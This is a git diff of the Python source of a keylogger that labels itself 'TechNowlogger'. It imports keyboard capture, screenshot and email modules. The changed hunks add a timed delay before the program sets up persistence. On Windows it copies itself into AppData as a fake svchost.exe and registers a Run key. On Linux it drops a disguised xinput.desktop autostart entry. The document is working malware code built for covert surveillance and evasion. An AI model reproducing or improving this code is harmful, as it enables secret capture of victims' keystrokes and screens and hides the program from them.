@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import pynput.keyboard
-import threading
+import threading 
 import smtplib
 import os
 import shutil
@@ -8,8 +8,8 @@ import subprocess
 import sys
 import stat
 import platform
-import getpass
-import time
+import getpass 
+import time 
 import tempfile
 from mss import mss
 # 15 to 18 lines for "send_mail_with_attachment()" function
@@ -111,24 +111,26 @@ class Keylogger:
             self.report()
             keyboard_listener.join()
 
-    def become_persistent(self):
+    def become_persistent(self, time_persistent):
         if sys.platform.startswith("win"):
-            self.become_persistent_on_windows()
+            self.become_persistent_on_windows(time_persistent)
         elif sys.platform.startswith("linux"):
-            self.become_persistent_on_linux()
+            self.become_persistent_on_linux(time_persistent)
 
-    def become_persistent_on_windows(self):
+    def become_persistent_on_windows(self, time_persistent):
         evil_file_location = os.environ["appdata"] + "\\svchost.exe"
         if not os.path.exists(evil_file_location):
+            time.sleep(time_persistent)
             self.log = "** TechNowlogger started on Windows System ** "
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svchost /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
-    def become_persistent_on_linux(self):
+    def become_persistent_on_linux(self, time_persistent):
         home_config_directory = os.path.expanduser('~') + "/.config/"
         autostart_path = home_config_directory + "/autostart/"
         autostart_file = autostart_path + "xinput.desktop"
         if not os.path.isfile(autostart_file):
+            time.sleep(time_persistent)
             self.log = "** TechNowlogger started On Linux System **"
             try:
                 os.makedirs(autostart_path)
